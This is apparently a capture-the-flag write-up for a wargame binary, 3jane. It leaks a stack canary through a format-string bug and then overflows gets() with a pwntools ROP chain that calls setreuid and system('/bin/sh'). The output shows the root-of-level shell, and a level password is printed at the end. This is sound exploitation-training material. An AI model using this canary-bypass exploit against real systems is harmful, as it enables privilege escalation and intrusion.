## Infos on the binary

```shell
level06@rainfall:~$ checksec 3jane
[*] '/home/level06/3jane'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This time, there is a canary.
"Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immediately."

We spot an unprotected call to gets() in `authenticate`, with the var having 136 bytes.

```shell
void authenticate(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("[3JANE] Access code: ");
  FUN_00401180(stdout);
  gets(local_98); # unprotected
    iVar1 = strncmp(local_98,"STRAYLIGHT_",0xb);
  if (iVar1 == 0) {
    printf("[3JANE] Access granted. Clearance level: %u\n",(ulong)(uint)vault._4_4_);
  }
  else {
    puts("[3JANE] Access denied.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(); # stack canary check
  }
  return;
```

There is also a call to printf() allowing a format string breach, in `log_request`, like in level04

```shell
void log_request(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("[3JANE] Request ID: ");
  FUN_00401180(stdout);
  fgets(local_58,0x40,stdin);
  sVar1 = strcspn(local_58,"\n");
  local_58[sVar1] = '\0';
  printf("[3JANE] Logging: ");
  printf(local_58);
```

We can see the canary detecting the overflow :

```shell
level06@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*200)' | ./3jane 
  [VILLA STRAYLIGHT] Access restricted.
  [3JANE] Convince me.
[3JANE] Request ID: [3JANE] Logging: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[3JANE] Access code: [3JANE] Access denied.
*** stack smashing detected ***: terminated
Aborted (core dumped)

```

With all these informations, we found this page explaining how to bypass a stack canary:

https://corruptedprotocol.medium.com/killer-queen-ctf-tweety-birb-canary-bypass-with-format-string-vulnerability-2f1f3b516fe2

It says we can find the value of the canary with a format string vuln, by printing the binary arguments. Canaries always have a value ending by '00', here by printing the 20 first args, we can see the canary seems to be at the 15th place "0x87236dd5c1251e00". The value is not the same each time we run the program.

```shell
level06@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*20)' | ./3jane 
  [VILLA STRAYLIGHT] Access restricted.
  [3JANE] Convince me.
[3JANE] Request ID: [3JANE] Logging: 0x7fffffffe090 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520 0x400000000 0x87236dd5c1251e00 0x7fffffffe2b0 0x401686 0x7fffffffe390 0x87236dd5c1251e00 0x7fffffffe350 
[3JANE] Access code: [3JANE] Access denied.
...
```

The purpose here is to find the canary value, then use it in the payload to bypass the canary check, and then use a rop chain as we proviously did to spawn a shell with correct uid.

We'll suppose for the following attempt that the canary is stored at position 15 (value that ends with \x00 and change everytime we run the programm)

First step:
* gather the canary with the first gets + unprotected printf -> %15$p will print it, then we store it in a variable

Second step:
* fill the buffer (A * 136)
* add the canary to prevent stack smashing detection
* overwrite RBP with ROP-Gadget

```python
from pwn import *

elf = context.binary = ELF('./3jane')
p = process('./3jane')

p.sendlineafter(b'Request ID: ', b'%15$p')
p.recvuntil(b'Logging: ')
rep = p.recvline().strip()
rep_int = int(rep, 16)

payload = b"A" * 136
payload += p64(rep_int)
payload += b"A" * 8
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1023)             # uid de flag05
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1023)             # uid de flag05
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system

p.sendlineafter(b'Access code: ', payload)

p.interactive()                  # to stay in stdin (like (...; cat) |)
```

```bash
python3 test.py
[*] '/home/level06/3jane'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './3jane': pid 2058
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$\xf6)\x8ez%sAAAAAAAA\x8d\xc0\xd0\xf7\xff\x7f\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00}\x0b\xd1\xf7\xff\x7f\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00ps\xd2\xf7\xff\x7f\x00\x00\x8d\xc0\xd0\xf7\xff\x7f\x00\x00/\xc4\xdc\xf7\xff\x7f\x00\x00P\x87\xc5\xf7\xff\x7f\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$\xf6)\x8ez%sP\xe2\xff\xff\xff\x7f\x00\x00'
[*] Switching to interactive mode
[3JANE] Access denied.
$ whoami
flag06
$ cat /home/flag06/.pass
c1t0kg9pklac7x4c7sn7iqgfppkz4usq
$ 

```

Success !